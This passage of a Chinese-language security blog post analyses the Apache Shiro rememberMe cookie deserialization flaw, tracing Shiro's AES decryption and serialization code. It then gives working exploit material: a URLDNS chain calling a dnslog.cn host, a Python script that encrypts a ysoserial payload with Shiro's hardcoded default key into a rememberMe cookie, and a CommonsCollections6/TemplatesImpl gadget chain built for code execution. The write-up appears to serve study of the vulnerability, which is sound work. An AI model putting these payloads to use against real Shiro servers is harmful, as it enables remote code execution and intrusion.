<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DefaultSecurityManager.java</span></span><br><span class="line"><span class="keyword">public</span> Subject <span class="title function_">createSubject</span><span class="params">(SubjectContext subjectContext)</span> &#123;</span><br><span class="line"></span><br><span class="line">	context = resolveSession(context);</span><br><span class="line">	<span class="comment">//1.这里先进行检测session，获取context</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 尝试解析 Principals（身份信息，比如用户名）</span></span><br><span class="line">    <span class="type">SubjectContext</span> <span class="variable">context</span> <span class="operator">=</span> resolvePrincipals(subjectContext); </span><br><span class="line">    <span class="comment">// ... 创建 Subject 实例 ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> SubjectContext <span class="title function_">resolvePrincipals</span><span class="params">(SubjectContext context)</span> &#123;</span><br><span class="line">    <span class="comment">// A. 先去 Session 里找（如果是已登录用户）</span></span><br><span class="line">    <span class="type">PrincipalCollection</span> <span class="variable">principals</span> <span class="operator">=</span> getPrincipals(context);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// B. 如果 Session 里没找到（principals 为空），说明可能是“记住我”的用户</span></span><br><span class="line">    <span class="keyword">if</span> (principals == <span class="literal">null</span> || principals.isEmpty()) &#123;</span><br><span class="line">        <span class="comment">// !!! 关键点来了 !!!</span></span><br><span class="line">        <span class="comment">// 调用 RememberMeManager 去检查 Cookie</span></span><br><span class="line">        principals = getRememberedIdentity(context); </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果找到了，这就把身份填进去</span></span><br><span class="line">        <span class="keyword">if</span> (principals != <span class="literal">null</span>) &#123;</span><br><span class="line">            context.setPrincipals(principals);</span><br><span class="line">            context.setAuthenticated(<span class="literal">false</span>); <span class="comment">// 注意：记住我登录不算“已认证”</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> context;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602141754617.png" alt="image-20260214175448562"></p>
<p><strong>接着调用</strong><code>AbstractRememberMeManager</code>中<code>getRememberedIdentity</code></p>
<p><code>DefaultSecurityManager</code> 里的 <code>getRememberedIdentity</code> 方法，实际上就是调用了配置的 <code>rememberMeManager</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DefaultSecurityManager.java</span></span><br><span class="line"><span class="keyword">public</span> PrincipalCollection <span class="title function_">getRememberedIdentity</span><span class="params">(SubjectContext subjectContext)</span> &#123;</span><br><span class="line">    <span class="type">RememberMeManager</span> <span class="variable">rmm</span> <span class="operator">=</span> getRememberedIdentity(subjectContext);</span><br><span class="line">    <span class="keyword">if</span> (rmm != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 这里的 rmm 就是 CookieRememberMeManager</span></span><br><span class="line">        <span class="comment">// 最终走到了你问的那行代码！</span></span><br><span class="line">        <span class="keyword">return</span> rmm.getRememberedPrincipals(subjectContext);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602141824447.png" alt="image-20260214182437392"></p>
<p><strong>接着</strong><code>org/apache/shiro/mgt/AbstractRememberMeManager.java</code>中<code>getRememberedPrincipals</code>方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602141830404.png" alt="image-20260214183036352"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">getRememberedSerializedIdentity</span><br><span class="line">    </span><br><span class="line"><span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> getCookie().readValue(request, response);</span><br><span class="line"><span class="keyword">if</span> (base64 != <span class="literal">null</span>) &#123;</span><br><span class="line">    base64 = ensurePadding(base64);</span><br><span class="line">    <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">        log.trace(<span class="string">&quot;Acquired Base64 encoded identity [&quot;</span> + base64 + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">byte</span>[] decoded = Base64.decode(base64);</span><br><span class="line">    <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">        log.trace(<span class="string">&quot;Base64 decoded byte array length: &quot;</span> + (decoded != <span class="literal">null</span> ? decoded.length : <span class="number">0</span>) + <span class="string">&quot; bytes.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> decoded;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p><strong>解密字符串</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602141841038.png" alt="image-20260214184112084"></p>
<p><strong>先解密后反序列化</strong></p>
<p><code>decrypt</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602141844913.png" alt="image-20260214184439874"></p>
<p>底层解密实现</p>
<p><code>org/apache/shiro/crypto/JcaCipherService.java#decrypt</code>这个是具体的解密算法</p>
<p>这里是解密的核心细节。服务器必须知道前16个字节是 IV，剩下的才是密文，否则无法解密。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JcaCipherService.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> ByteSource <span class="title function_">decrypt</span><span class="params">(<span class="type">byte</span>[] ciphertext, <span class="type">byte</span>[] key)</span> <span class="keyword">throws</span> CryptoException &#123;</span><br><span class="line">    <span class="type">byte</span>[] encrypted = ciphertext;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 默认是 true，表示密文中包含 IV</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">prependIv</span> <span class="operator">=</span> isGenerateInitializationVectors(<span class="literal">false</span>); </span><br><span class="line">    </span><br><span class="line">    <span class="type">byte</span>[] iv = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (prependIv) &#123;</span><br><span class="line">        <span class="comment">// 1. 获取 IV 的长度，AES 默认 128 bit = 16 bytes</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">ivSize</span> <span class="operator">=</span> getInitializationVectorSize(); </span><br><span class="line">        <span class="type">int</span> <span class="variable">ivByteSize</span> <span class="operator">=</span> ivSize / <span class="number">8</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 2. 提取前 16 字节作为 IV</span></span><br><span class="line">        iv = <span class="keyword">new</span> <span class="title class_">byte</span>[ivByteSize];</span><br><span class="line">        System.arraycopy(ciphertext, <span class="number">0</span>, iv, <span class="number">0</span>, ivByteSize);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 3. 剩下的字节作为真正的密文</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">encryptedSize</span> <span class="operator">=</span> ciphertext.length - ivByteSize;</span><br><span class="line">        encrypted = <span class="keyword">new</span> <span class="title class_">byte</span>[encryptedSize];</span><br><span class="line">        System.arraycopy(ciphertext, ivByteSize, encrypted, <span class="number">0</span>, encryptedSize);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 4. 执行 AES 解密</span></span><br><span class="line">    <span class="keyword">return</span> decrypt(encrypted, key, iv);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> ByteSource <span class="title function_">decrypt</span><span class="params">(<span class="type">byte</span>[] ciphertext, <span class="type">byte</span>[] key, <span class="type">byte</span>[] iv)</span> <span class="keyword">throws</span> CryptoException &#123;</span><br><span class="line">    <span class="comment">// Cipher.getInstance(&quot;AES/CBC/PKCS5Padding&quot;);</span></span><br><span class="line">    <span class="comment">// cipher.init(Cipher.DECRYPT_MODE, key, ivSpec);</span></span><br><span class="line">    <span class="comment">// return cipher.doFinal(ciphertext);</span></span><br><span class="line">    <span class="comment">// ... 这一步如果 Key 对不上，或者 IV 对不上，Padding 就会报错，抛出异常</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>deserialize</code></p>
<p><code>org/apache/shiro/io/DefaultSerializer#deserialize</code></p>
<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602141855362.png" alt="image-20260214185518307" style="zoom:67%;" />

<p>在这里调用了<code>readObject</code>方法，作为我们漏洞的调用类</p>
<h3 id="2-加密过程"><a href="#2-加密过程" class="headerlink" title="2.加密过程"></a>2.加密过程</h3><p><strong>入口省略，直接从开始加密追踪</strong></p>
<p><code>org/apache/shiro/mgt/AbstractRememberMeManager#onSuccessfulLogin</code></p>
<p><strong>rememberIdentity 方法</strong></p>
<p><code>org/apache/shiro/mgt/AbstractRememberMeManager#rememberIdentity</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602141926665.png" alt="image-20260214192642625"></p>
<p>第一个方法返回用户名补全属性</p>
<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602141927338.png" alt="image-20260214192742295" style="zoom: 67%;" />

<p>第二个重构调用</p>
<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602141928610.png" alt="image-20260214192844565"></p>
<p>**这里接着调用解密方法 convertPrincipalsToBytes **</p>
<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602141917718.png" alt="image-20260214191758654"></p>
<p><strong>这里的加密方法与之前解密如出一辙</strong></p>
<p><code>org/apache/shiro/mgt/AbstractRememberMeManager#convertPrincipalsToBytes</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602141919763.png" alt="image-20260214191917719"></p>
<p><strong>序列化方法如下图</strong></p>
<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602141930041.png" alt="image-20260214193032964" style="zoom:50%;" />

<p><strong>加密过程</strong></p>
<p>依旧是嵌套方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602141935106.png" alt="image-20260214193516057"></p>
<p>这个<code>key</code>值依旧是定值</p>
<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602141936861.png" alt="image-20260214193611809"></p>
<p>深度加密，构造<code>vi</code></p>
<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602141937310.png" alt="image-20260214193727251" style="zoom: 50%;" />

<p>长度为16</p>
<p><strong>自此逻辑结束</strong></p>
<h2 id="四、payload构造"><a href="#四、payload构造" class="headerlink" title="四、payload构造"></a>四、<code>payload</code>构造</h2><h3 id="1-URLDNS-链"><a href="#1-URLDNS-链" class="headerlink" title="1.URLDNS 链"></a>1.<code>URLDNS</code> 链</h3><p>构造<code>DNSLOG</code>链条</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//反射获取URL类的hashCode字段</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">URLClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> URLClass.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        Map&lt;URL,Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://62k5gt.dnslog.cn&quot;</span>);</span><br><span class="line"><span class="comment">//将hashCode字段值设置为1234，从而不会触发put时的hashCode计算</span></span><br><span class="line">        hashCode.set(url,<span class="number">1234</span>);</span><br><span class="line">        map.put(url,<span class="number">1</span>);</span><br><span class="line"><span class="comment">//put完成之后设置其值为-1，从而导致之后反序列化时触发hashCode计算</span></span><br><span class="line">        hashCode.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(map);</span><br></pre></td></tr></table></figure>

<p><strong>对生成后的字节码文件加密</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line"><span class="comment"># Shiro 默认的硬编码 Key (Shiro 1.2.4 及以下版本)</span></span><br><span class="line"><span class="comment"># 如果是其他环境，请替换为你通过工具爆破出的 Key</span></span><br><span class="line">DEFAULT_KEY = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shiro_encrypt</span>(<span class="params">file_path, key_base64</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    读取序列化文件并进行 Shiro 格式的加密</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 1. 读取序列化后的对象数据 (ysoserial 生成的 .ser 文件)</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            payload = f.read()</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 成功读取文件: <span class="subst">&#123;file_path&#125;</span> (<span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span> bytes)&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2. 解码 Key</span></span><br><span class="line">        key = base64.b64decode(key_base64)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 3. 生成随机 IV (Initialization Vector), 长度 16 字节</span></span><br><span class="line">        iv = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 4. 初始化 AES Cipher (CBC 模式)</span></span><br><span class="line">        cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 5. 进行 PKCS7 填充并加密</span></span><br><span class="line">        <span class="comment"># AES 块大小通常为 16 字节 (128位)</span></span><br><span class="line">        encrypted_payload = cipher.encrypt(pad(payload, AES.block_size))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 6. 拼接: Shiro 规定 IV 必须放在密文的最前面</span></span><br><span class="line">        final_data = iv + encrypted_payload</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 7. Base64 编码作为 Cookie 值</span></span><br><span class="line">        cookie_value = base64.b64encode(final_data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> cookie_value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] 发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 使用示例</span></span><br><span class="line">    <span class="comment"># 假设你已经用 ysoserial 生成了 payload:</span></span><br><span class="line">    <span class="comment"># java -jar ysoserial.jar CommonsCollections6 &quot;calc&quot; &gt; payload.ser</span></span><br><span class="line"></span><br><span class="line">    target_file = <span class="string">&quot;chuan.txt&quot;</span>  <span class="comment"># 你的序列化文件路径</span></span><br><span class="line">    target_key = DEFAULT_KEY  <span class="comment"># 你的 Key</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 为了演示，如果文件不存在，我们创建一个假的 payload</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(target_file):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 未找到 <span class="subst">&#123;target_file&#125;</span>，生成测试数据...&quot;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(target_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="string">b&#x27;This is just a test payload for demonstration&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">50</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 使用 Key: <span class="subst">&#123;target_key&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line">    cookie = shiro_encrypt(target_file, target_key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> cookie:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n[+] 生成的 rememberMe Cookie 值:\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(cookie)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;-&quot;</span> * <span class="number">50</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] 使用方法: 在 HTTP 请求头中添加 -&gt; Cookie: rememberMe=&quot;</span> + cookie)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602142051270.png" alt="image-20260214205159209"></p>
<p>将字串替换<code>remember</code>字段</p>
<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602142056897.png" alt="image-20260214205603834"></p>
<p>注意这里需要将原本的<code>JsessionId</code>删除，以是服务器解析我们的恶意类</p>
<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602142050965.png" alt="image-20260214205037630" style="zoom:50%;" />

<h3 id="2-CC6-优化链"><a href="#2-CC6-优化链" class="headerlink" title="2.CC6 优化链"></a>2.<code>CC6</code> 优化链</h3><p>直接是用<code>CC6</code>发送服务端会报错</p>
<p><strong>原因是</strong></p>
<p>如果在<code>shiro</code>反序列化流中包含<strong>非 Java 自身的数组</strong>，则会出现无法加载类的错误，因此<code>CC6</code>原版报废</p>
<p>为了构造一个不含数组的<code>CC</code>链，尝试优化，创造出了<code>CC11</code></p>
<p>在前面学习工程中，我们发现<code>CC6</code>的<code>LazyMap.get</code>方法会调用传进来的参数<code>key</code>，结合之前提到的利用<code>TemplatesImpl</code>加载外部类的静态代码块，尝试构造一个没有数组的链</p>
<p><code>TemplatesImpl</code>自身链</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\32768\\Desktop\\HelloTranslet.class&quot;</span>));</span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="comment">//反射修改内部属性</span></span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br></pre></td></tr></table></figure>

<p>结合<code>CC6</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Transformer</span> <span class="variable">chuan0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chuan0000</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.lazyMap(map,chuan0000);</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">foo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, obj);</span><br><span class="line"><span class="comment">//在这里构造的时候直接将恶意类构造，从而在调用LazyMap.get方法时，将其传入</span></span><br><span class="line"></span><br><span class="line"><span class="type">HashMap</span> <span class="variable">obj2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">obj2.put(foo, <span class="string">&quot;bar&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">f.set(lazyMap, chuan0);</span><br><span class="line"></span><br><span class="line">map.clear();</span><br><span class="line"><span class="comment">//这里直接清除</span></span><br></pre></td></tr></table></figure>

<p>最终执行的便是<code>obj.newTransformer()</code>方法</p>
<p><strong>然后将字节码文件对称加密</strong></p>
